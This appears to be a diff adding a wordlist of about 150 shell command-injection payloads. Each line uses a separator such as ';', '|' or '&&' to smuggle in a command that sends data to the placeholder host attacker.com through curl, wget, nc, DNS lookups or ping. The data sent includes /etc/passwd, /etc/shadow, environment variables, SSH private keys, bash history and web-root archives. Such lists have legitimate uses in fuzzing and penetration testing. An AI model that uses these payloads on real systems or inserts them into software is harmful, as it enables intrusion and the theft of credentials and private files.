@@ -1,0 +1,150 @@
+; curl http://attacker.com/?data=$(cat /etc/passwd)
+; wget http://attacker.com/?data=$(cat /etc/passwd)
+; curl http://attacker.com/?data=$(whoami)
+; wget http://attacker.com/?data=$(whoami)
+| curl http://attacker.com/?data=$(cat /etc/passwd)
+| wget http://attacker.com/?data=$(cat /etc/passwd)
+| curl http://attacker.com/?data=$(whoami)
+| wget http://attacker.com/?data=$(whoami)
+|| curl http://attacker.com/?data=$(cat /etc/passwd)
+|| wget http://attacker.com/?data=$(cat /etc/passwd)
+|| curl http://attacker.com/?data=$(whoami)
+|| wget http://attacker.com/?data=$(whoami)
+& curl http://attacker.com/?data=$(cat /etc/passwd)
+& wget http://attacker.com/?data=$(cat /etc/passwd)
+& curl http://attacker.com/?data=$(whoami)
+& wget http://attacker.com/?data=$(whoami)
+&& curl http://attacker.com/?data=$(cat /etc/passwd)
+&& wget http://attacker.com/?data=$(cat /etc/passwd)
+&& curl http://attacker.com/?data=$(whoami)
+&& wget http://attacker.com/?data=$(whoami)
+; cat /etc/passwd | curl -X POST -d @- http://attacker.com
+; cat /etc/shadow | curl -X POST -d @- http://attacker.com
+; cat /etc/hosts | curl -X POST -d @- http://attacker.com
+| cat /etc/passwd | curl -X POST -d @- http://attacker.com
+| cat /etc/shadow | curl -X POST -d @- http://attacker.com
+| cat /etc/hosts | curl -X POST -d @- http://attacker.com
+|| cat /etc/passwd | curl -X POST -d @- http://attacker.com
+|| cat /etc/shadow | curl -X POST -d @- http://attacker.com
+|| cat /etc/hosts | curl -X POST -d @- http://attacker.com
+& cat /etc/passwd | curl -X POST -d @- http://attacker.com
+& cat /etc/shadow | curl -X POST -d @- http://attacker.com
+& cat /etc/hosts | curl -X POST -d @- http://attacker.com
+&& cat /etc/passwd | curl -X POST -d @- http://attacker.com
+&& cat /etc/shadow | curl -X POST -d @- http://attacker.com
+&& cat /etc/hosts | curl -X POST -d @- http://attacker.com
+; env | curl -X POST -d @- http://attacker.com
+; printenv | curl -X POST -d @- http://attacker.com
+; set | curl -X POST -d @- http://attacker.com
+| env | curl -X POST -d @- http://attacker.com
+| printenv | curl -X POST -d @- http://attacker.com
+| set | curl -X POST -d @- http://attacker.com
+|| env | curl -X POST -d @- http://attacker.com
+|| printenv | curl -X POST -d @- http://attacker.com
+|| set | curl -X POST -d @- http://attacker.com
+& env | curl -X POST -d @- http://attacker.com
+& printenv | curl -X POST -d @- http://attacker.com
+& set | curl -X POST -d @- http://attacker.com
+&& env | curl -X POST -d @- http://attacker.com
+&& printenv | curl -X POST -d @- http://attacker.com
+&& set | curl -X POST -d @- http://attacker.com
+; cat /etc/passwd | nc attacker.com 4444
+; cat /etc/shadow | nc attacker.com 4444
+; whoami | nc attacker.com 4444
+; id | nc attacker.com 4444
+| cat /etc/passwd | nc attacker.com 4444
+| cat /etc/shadow | nc attacker.com 4444
+| whoami | nc attacker.com 4444
+| id | nc attacker.com 4444
+|| cat /etc/passwd | nc attacker.com 4444
+|| cat /etc/shadow | nc attacker.com 4444
+|| whoami | nc attacker.com 4444
+|| id | nc attacker.com 4444
+& cat /etc/passwd | nc attacker.com 4444
+& cat /etc/shadow | nc attacker.com 4444
+& whoami | nc attacker.com 4444
+& id | nc attacker.com 4444
+&& cat /etc/passwd | nc attacker.com 4444
+&& cat /etc/shadow | nc attacker.com 4444
+&& whoami | nc attacker.com 4444
+&& id | nc attacker.com 4444
+; cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+; cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+| cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+| cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+|| cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+|| cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+& cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+& cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+&& cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+&& cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+; nslookup $(whoami).attacker.com
+; nslookup $(cat /etc/hostname).attacker.com
+; dig $(whoami).attacker.com
+; dig $(cat /etc/hostname).attacker.com
+| nslookup $(whoami).attacker.com
+| nslookup $(cat /etc/hostname).attacker.com
+| dig $(whoami).attacker.com
+| dig $(cat /etc/hostname).attacker.com
+|| nslookup $(whoami).attacker.com
+|| nslookup $(cat /etc/hostname).attacker.com
+|| dig $(whoami).attacker.com
+|| dig $(cat /etc/hostname).attacker.com
+& nslookup $(whoami).attacker.com
+& nslookup $(cat /etc/hostname).attacker.com
+& dig $(whoami).attacker.com
+& dig $(cat /etc/hostname).attacker.com
+&& nslookup $(whoami).attacker.com
+&& nslookup $(cat /etc/hostname).attacker.com
+&& dig $(whoami).attacker.com
+&& dig $(cat /etc/hostname).attacker.com
+; ping -c 1 $(whoami).attacker.com
+; ping -c 1 $(hostname).attacker.com
+| ping -c 1 $(whoami).attacker.com
+| ping -c 1 $(hostname).attacker.com
+|| ping -c 1 $(whoami).attacker.com
+|| ping -c 1 $(hostname).attacker.com
+& ping -c 1 $(whoami).attacker.com
+& ping -c 1 $(hostname).attacker.com
+&& ping -c 1 $(whoami).attacker.com
+&& ping -c 1 $(hostname).attacker.com
+; tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+; tar czf - /var/www | curl -X POST -d @- http://attacker.com
+| tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+| tar czf - /var/www | curl -X POST -d @- http://attacker.com
+|| tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+|| tar czf - /var/www | curl -X POST -d @- http://attacker.com
+& tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+& tar czf - /var/www | curl -X POST -d @- http://attacker.com
+&& tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+&& tar czf - /var/www | curl -X POST -d @- http://attacker.com
+; ls -la | curl -X POST -d @- http://attacker.com
+; ps aux | curl -X POST -d @- http://attacker.com
+; netstat -an | curl -X POST -d @- http://attacker.com
+| ls -la | curl -X POST -d @- http://attacker.com
+| ps aux | curl -X POST -d @- http://attacker.com
+| netstat -an | curl -X POST -d @- http://attacker.com
+|| ls -la | curl -X POST -d @- http://attacker.com
+|| ps aux | curl -X POST -d @- http://attacker.com
+|| netstat -an | curl -X POST -d @- http://attacker.com
+& ls -la | curl -X POST -d @- http://attacker.com
+& ps aux | curl -X POST -d @- http://attacker.com
+& netstat -an | curl -X POST -d @- http://attacker.com
+&& ls -la | curl -X POST -d @- http://attacker.com
+&& ps aux | curl -X POST -d @- http://attacker.com
+&& netstat -an | curl -X POST -d @- http://attacker.com
+; cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+; cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+; cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+| cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+| cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+| cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+|| cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+|| cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+|| cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+& cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+& cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+& cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+&& cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+&& cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+&& cat ~/.bash_history | curl -X POST -d @- http://attacker.com
